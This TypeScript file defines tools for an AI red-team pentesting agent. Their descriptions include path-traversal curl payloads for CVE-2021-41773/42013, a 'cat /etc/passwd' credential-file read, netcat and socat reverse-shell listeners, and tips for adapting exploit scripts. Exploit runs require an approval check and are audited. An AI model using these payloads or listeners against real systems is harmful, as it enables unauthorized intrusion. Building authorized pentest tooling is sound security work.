import { FunctionTool } from '@google/adk'
import { z } from 'zod/v4'
import { db } from '../../shared/db-client.js'
import {
  kesExec,
  kesStartBackground,
  kesBackgroundStatus,
  kesKillBackground,
  kesGetLhost,
  kesGetInterfaces,
} from '../../shared/kes-client.js'
import { createLogger } from '../../shared/logger.js'

const logger = createLogger('red_team_agent')

// ─────────────────────────────────────────────────────────────────
// Tool 1: run_command — Execute any allowed command on the Kali box
// ─────────────────────────────────────────────────────────────────

export const runCommandTool = new FunctionTool({
  name: 'run_command',
  description: `Execute a shell command on the Kali pentesting container. Returns stdout, stderr, and exit code.

Use this for:
  - Post-exploitation proof: "whoami", "id", "cat /etc/passwd"
  - Ad-hoc enumeration: "snmpwalk -v2c -c public 172.30.0.10"
  - Custom one-liners: "curl -s http://target/robots.txt"
  - Network utilities: "ping -c 2 172.30.0.11", "dig target.local"
  - Any command in the allowlist that doesn't have a dedicated tool

PATH TRAVERSAL / LFI — MANDATORY:
ALWAYS add --path-as-is when testing path traversal with curl.
Without it curl normalizes /.%2e/ before sending — the server sees a clean path and returns 404
even when the vulnerability exists.
  WRONG:   curl -s "http://target/cgi-bin/.%2e/.%2e/etc/passwd"
  CORRECT: curl -s --path-as-is "http://target/cgi-bin/.%2e/.%2e/etc/passwd"
  CORRECT: curl -s --path-as-is "http://target/icons/.%2e%2e/.%2e%2e/.%2e%2e/etc/passwd"
This applies to ALL path traversal CVEs: CVE-2021-41773, CVE-2021-42013, Drupalgeddon, any LFI.

CRITICAL RULES FOR EXPLOITS & SCRIPTS:
- If you are going to run a script that performs an exploit (e.g., from ExploitDB like /usr/share/exploitdb/...), MUST set isExploit to true and provide an approvalId.
- ALWAYS analyze its source code FIRST (using "cat <filepath>") to understand its exact requirements, parameters, and flags before exploiting.
- NEVER run a command that expects interactive user input. If a script requires interaction, use "sed" or "awk" to modify it, or pipe input into it.
- When using head/tail, use standard POSIX flags like "head -n 50" instead of "head -50" to prevent unknown option errors.

The command must be in the Kali service allowlist. Use the specific scan tools (nmap_scan, nuclei_scan, etc.)
when available, as they provide parsed output.`,
  parameters: z.object({
    command: z.string().describe('Shell command to execute'),
    timeout: z.number().optional().describe('Timeout in seconds (default 60)'), 
    campaignId: z.string().optional().describe('Campaign UUID from your task prompt. Copy it exactly — never invent one.'),
    isExploit: z.boolean().optional().describe('Set to true if this command is executing an exploit. Defaults to false.'),
    approvalId: z.string().optional().describe('The UUID of the approved request from your database (REQUIRED if isExploit is true).'),
  }),
  execute: async ({ command, timeout, campaignId, isExploit, approvalId }) => {
    if (isExploit) {
      if (!approvalId) {
        return {
          error: 'This is an exploit command but no approvalId was provided. You MUST request an approval first using request_approval, wait for the user to approve it, and then pass the approvalId here.',
        }
      }

      const res = await db.query(
        'SELECT status FROM approval_requests WHERE id = $1',
        [approvalId],
      )

      if (res.rows.length === 0) {
        return {
          error: `Approval ID ${approvalId} not found in database. You must request approval first.`,
        }
      }

      if (res.rows[0].status !== 'approved') {
        return {
          error: `Approval ID ${approvalId} is not approved. Current status: ${res.rows[0].status}. Please wait for user approval.`,
        }
      }
    }

    const start = Date.now()

    const cleaned = command
      .split('\n')
      .filter(line => !/^\s*#/.test(line))
      .join('\n')
      .trim()

    if (!cleaned) {
      return { stdout: '', stderr: 'Command was empty after stripping comment lines.', returncode: 1, timedOut: false }
    }

    let execCmd = cleaned
    if (!execCmd.startsWith('bash -c') && !execCmd.startsWith('sh -c')) {
      execCmd = `bash -c ${JSON.stringify(cleaned)}`
    }

    const result = await kesExec(execCmd, timeout ?? 60)

    await logger.audit(
      'run_command',
      { command },
      {
        stdout: result.stdout.slice(0, 10000),
        stderr: result.stderr.slice(0, 2000),
        returncode: result.returncode,
      },
      Date.now() - start,
      campaignId,
    )

    // Truncate stdout to avoid bloating agent context — full output is in audit log
    const MAX_STDOUT = 4000
    const truncated = result.stdout.length > MAX_STDOUT
    return {
      stdout: truncated ? result.stdout.slice(0, MAX_STDOUT) + `\n...[truncated — ${result.stdout.length - MAX_STDOUT} more bytes in audit log]` : result.stdout,
      stderr: result.stderr.slice(0, 1000),
      returncode: result.returncode,
      timedOut: result.timedOut,
    }
  },
})

// ─────────────────────────────────────────────────────────────────
// Tool 2: start_listener — Background listener (e.g. nc, socat)
// ─────────────────────────────────────────────────────────────────

export const startListenerTool = new FunctionTool({
  name: 'start_listener',
  description: `Start a background listener on the Kali container to receive reverse shells.

Use this when:
  - An exploit sends a reverse shell via bash/python/etc. (not through MSF handler)
  - You need a Netcat listener: "nc -lvnp 4444"
  - You need a socat listener: "socat TCP-LISTEN:4444,reuseaddr,fork STDOUT"

The listener runs in the background. Use check_listener to see if a connection was received,
and kill_listener to stop it when done.

LHOST for your listener is auto-detected — use get_local_ip to see it.`,
  parameters: z.object({
    command: z.string().describe('Listener command, e.g. "nc -lvnp 4444" or "socat TCP-LISTEN:4444,reuseaddr,fork STDOUT"'),
    campaignId: z.string().optional().describe('Campaign UUID from your task prompt. Copy it exactly — never invent one.'),
  }),
  execute: async ({ command, campaignId }) => {
    const start = Date.now()
    const job = await kesStartBackground(command)

    await logger.audit(
      'start_listener',
      { command },
      { jobId: job.jobId, pid: job.pid },
      Date.now() - start,
      campaignId,
    )

    return {
      jobId: job.jobId,
      pid: job.pid,
      message: `Listener started. Use check_listener with jobId="${job.jobId}" to check for connections.`,
    }
  },
})

// ─────────────────────────────────────────────────────────────────
// Tool 3: check_listener — Check status of a background listener
// ─────────────────────────────────────────────────────────────────

export const checkListenerTool = new FunctionTool({
  name: 'check_listener',
  description: 'Check the status of a background listener. If finished (connection received and closed), returns the captured output.',
  parameters: z.object({
    jobId: z.string().describe('Job ID from start_listener'),
  }),
  execute: async ({ jobId }) => {
    const status = await kesBackgroundStatus(jobId)
    return status
  },
})

// ─────────────────────────────────────────────────────────────────
// Tool 4: kill_listener — Stop a background listener
// ─────────────────────────────────────────────────────────────────

export const killListenerTool = new FunctionTool({
  name: 'kill_listener',
  description: 'Kill a running background listener when you no longer need it.',
  parameters: z.object({
    jobId: z.string().describe('Job ID from start_listener'),
  }),
  execute: async ({ jobId }) => {
    await kesKillBackground(jobId)
    return { killed: true, jobId }
  },
})

// ─────────────────────────────────────────────────────────────────
// Tool 5: get_local_ip — Get the Kali container's IP addresses
// ─────────────────────────────────────────────────────────────────

export const getLocalIpTool = new FunctionTool({
  name: 'get_local_ip',
  description: `Get the Kali pentesting container's IP addresses.
Returns the preferred LHOST (the IP on the target network) and all IPs.

Use this to:
  - Know what LHOST to use for reverse shells / listeners
  - Verify network connectivity to targets`,
  parameters: z.object({}),
  execute: async () => {
    const [lhost, interfaces] = await Promise.all([
      kesGetLhost(),
      kesGetInterfaces(),
    ])

    return {
      lhost,
      allIps: interfaces,
      hint: lhost
        ? `Use ${lhost} as LHOST for reverse payloads and listeners.`
        : 'Could not detect LHOST. Set KALI_LHOST env var on the kali-service container.',
    }
  },
})
